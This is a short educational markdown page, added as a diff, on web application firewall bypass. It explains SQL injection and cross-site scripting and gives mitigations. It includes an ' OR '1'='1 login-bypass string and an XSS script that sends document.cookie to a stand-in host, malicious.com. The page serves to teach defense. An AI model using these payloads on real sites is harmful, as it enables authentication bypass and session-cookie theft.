@@ -1,0 +1,71 @@
+# WAF Bypass
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Web Application Firewall (WAF) Bypass is a technique used by threat actors to circumvent security measures put in place to protect web applications. Fundamentally, a WAF is a protection tool that sits between a web application and the internet. It operates by analysing HTTP requests to identify and mitigate potential attacks.
+> 
+
+### 🧐 Why ?
+
+> Understanding WAF Bypass is critical as it underlines the importance of robust and comprehensive cybersecurity defenses. Web applications are frequently targeted by attackers due to their broad exposure to the internet, and the potential for high-value data theft. A WAF can help protect against such attacks, but if a WAF Bypass technique is successfully deployed, the security layer provided by the WAF is effectively nullified.
+> 
+
+### ⛏️ How ?
+
+> To use or implement WAF Bypass techniques, a deep understanding of the WAF's rules and logic is required. This often involves extensive reconnaissance to identify potential weaknesses. Once these have been identified, various techniques such as input obfuscation, HTTP verb tampering, or cookie manipulation can be used to attempt to bypass the WAF. It's crucial to note that these techniques are typically used by threat actors and their use may be illegal.
+> 
+
+### ⏳ When ?
+
+> The practice of WAF Bypass has been in use since the inception of WAF technology itself. As long as there have been defenses, there have been those seeking to bypass them. The sophistication and effectiveness of WAF Bypass techniques have evolved in tandem with the WAF technology itself.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+Web Application Firewall (WAF) Bypass techniques exploit the logic that a WAF uses to identify and block malicious traffic. By manipulating this logic, threat actors can allow their harmful requests to pass through to the web application, effectively bypassing the security measures in place.
+
+One common method used for WAF Bypass is SQL Injection. In this technique, threat actors manipulate SQL queries by inserting malicious code. This could involve altering existing queries or adding new ones that lead to unintended actions, such as unauthorized data access or modification. If the WAF isn't properly configured to recognize this abnormal behaviour, it may allow the malicious request to pass through.
+
+Another technique used in WAF Bypass is Cross-Site Scripting (XSS). This involves an attacker injecting malicious scripts into trusted websites. These scripts are often designed to steal sensitive data from users or perform other harmful actions. If the WAF isn't programmed to block such scripts, they may make it through to the web application.
+
+To mitigate these threats, it's crucial to regularly update and configure the WAF based on the current threat landscape. This involves staying informed about common WAF Bypass techniques and ensuring the WAF rules and logic are robust enough to block them. Regularly testing the WAF's effectiveness using techniques such as penetration testing or employing threat intelligence services can also be beneficial.
+
+Moreover, it's important to note that WAFs should not be the only line of defense. They should be used as part of a layered security approach that includes other measures such as secure coding practices, intrusion detection systems, and regular security audits.
+
+For example, consider a web application that uses a simple SQL query to authenticate users:
+
+```sql
+SELECT * FROM users WHERE username ='"+ username +"' AND password ='"+ password +"'
+
+```
+
+Suppose a threat actor enters `' OR '1'='1` as the username and password. The SQL query becomes:
+
+```sql
+SELECT * FROM users WHERE username ='' OR '1'='1' AND password ='' OR '1'='1'
+
+```
+
+This query will always return true, allowing the attacker to bypass the authentication process.
+
+For Cross-Site Scripting (XSS), suppose a web application displays user comments without proper sanitization. An attacker could enter a comment like:
+
+```html
+<script>document.location='http://malicious.com?cookie='+document.cookie;</script>
+
+```
+
+This script, when rendered by the browser, would send the user's cookies to the attacker's server.
+
+The WAF should recognize these as threats. If not, it may be due to outdated rules or misconfiguration. Regular updates and thorough testing can help prevent such bypasses.
+
+For the SQL Injection example, using parameterized queries or prepared statements can help. For the XSS example, sanitizing user inputs and implementing a Content Security Policy (CSP) can be effective.
+
+Remember, WAF is just one layer of protection. Other security measures should also be in place.
